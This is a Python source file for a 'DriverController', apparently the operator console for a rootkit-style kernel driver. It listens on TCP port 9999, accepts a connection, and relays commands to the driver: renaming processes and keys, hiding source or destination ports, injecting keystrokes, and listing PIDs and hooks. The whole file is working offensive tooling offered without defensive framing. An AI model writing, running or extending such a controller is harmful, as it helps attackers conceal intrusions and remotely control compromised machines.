import socket
import struct


class DriverController:
    def __init__(self, host: str | None = None, port: int | None = None):
        self._host = host or '0.0.0.0'
        self._port = port or 9999
        self._available_commands = (
            "0x26", "rpid", "rname", "hfile", "key", "net_src", "net_dst", "kb"
        )
        self._commands_with_result = (
            "pids", "hooks"
        )
        self._oks = (b'ok', b'OK')
        self._socket = None
        self._inited = False

    def init(self):
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._socket.bind((self._host, self._port))
        self._socket.listen()
        self._socket, _ = self._socket.accept()
        self._inited = True

    def start(self):
        if not self._inited:
            raise RuntimeError("You must call .init() first!")
        command = None
        while command != 'quit':
            command = input('cmd >')
            first_part = command.split()[0]
            if not (first_part in self._available_commands or first_part in self._commands_with_result):
                print("Please, do things as it says here:")
                self.help()
                continue
            payload_size = self._form_size_of_payload(command)
            self._socket.send(payload_size)
            self._check_ok(self._socket.recv(2))  # ok
            self._socket.send(command.encode())
            self._check_ok(self._socket.recv(2))  # ok
            if command in self._commands_with_result:
                size = self._socket.recv(4)  # size of answer
                if size == b'fail':
                    self._announce_fail()
                    continue
                self._socket.send(b'OK')
                size = int.from_bytes(size, 'big')
                resp = self._socket.recv(size)  # answer
                self._print_result(command, resp)
        self._socket.close()

    @staticmethod
    def _form_size_of_payload(payload: str) -> bytes:
        result = len(payload)
        return struct.pack("i", result)

    def _check_ok(self, answer: bytes):
        if answer not in self._oks:
            raise RuntimeError("Server sent wrong answer")

    @staticmethod
    def _announce_fail():
        print('Looks like driver failed')

    @staticmethod
    def help():
        print(r"""
        test syscall: 0x26
        rename process for pid: rpid <%d> <%s>
        rename process for name: rname <%s> <%s>
        rename key: key <%s> <%s>
        hide port src: net_src <%d>
        hide port dst: net_dst <%d>
        press keyboard: kb <%s>
        """)

    @staticmethod
    def _print_result(cmd: str, result: bytes) -> None:
        result = result.decode()
        if cmd in ('pids', 'hooks'):
            info = result.split('\n')
            for line in info:
                print(line)
        else:
            raise NotImplementedError("Not yet implemented result for this command")


def main():
    dc = DriverController()
    dc.help()
    dc.init()
    dc.start()


if __name__ == '__main__':
    main()